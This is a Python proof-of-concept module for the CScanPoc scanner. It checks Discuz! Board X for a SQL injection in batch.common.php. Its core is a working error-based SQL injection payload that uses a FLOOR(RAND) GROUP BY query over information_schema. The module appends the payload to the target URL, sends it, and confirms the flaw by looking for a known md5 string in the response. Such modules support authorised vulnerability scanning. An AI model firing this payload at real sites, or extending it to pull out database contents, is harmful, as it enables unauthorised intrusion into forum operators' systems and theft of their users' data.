# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Discuz_0010'  # 平台漏洞编号，留空
    name = 'Discuz! Board X batch.common.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2017-11-08'  # 漏洞公布时间
    desc = '''
        Discuz! 是一款用 PHP 编写的，支持 MySQL 和 PostgreSQL 数据库的互联网论坛软件。它是在中国最受欢迎的互联网论坛软件。,Discuz! Board X batch.common.php SQL 注入漏洞
    '''  # 漏洞描述
    ref = 'https://help.aliyun.com/knowledge_detail/37476.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c3639757-7790-4dcf-8de7-eba84a03173c'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = '/batch.common.php?action=modelquote&cid=1&name=spacecomments,(SELECT%203284%20FROM(SELECT%20COUNT(*),CONCAT(CH' \
                'AR(58,105,99,104,58),(MID((IFNULL(CAST(md5(160341893519135)%20AS%20CHAR),CHAR(32))),1,50)),' \
                'CHAR(58,107,111,117,58),FLOOR(RAND(0)*2))x%20FROM%20information_schema.tables%20GROUP%20BY%20x)a)'
            target = arg + payload
            code, head, res, errcode, finalurl = hh.http(target)

            if code == 200:
                if "3c6b20b60b3f57247420047ab16d3d71" in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
